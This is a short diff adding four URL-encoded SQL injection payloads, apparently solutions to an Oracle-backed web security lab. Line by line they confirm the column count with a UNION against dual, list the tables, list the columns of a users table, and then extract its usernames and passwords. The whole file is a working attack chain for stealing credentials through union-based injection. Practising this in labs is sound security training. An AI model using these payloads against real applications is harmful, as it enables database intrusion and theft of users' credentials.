@@ -1,0 +1,4 @@
+'+union+select+'a','b'+from+dual--
+'+union+select+table_name,null+from+all_tables--
+'+union+select+column_name,null+from+all_tab_columns+where+table_name='USERS_RQBZNU'--
+'+union+select+USERNAME_WURILL,PASSWORD_PYOKSA+from+USERS_RQBZNU--
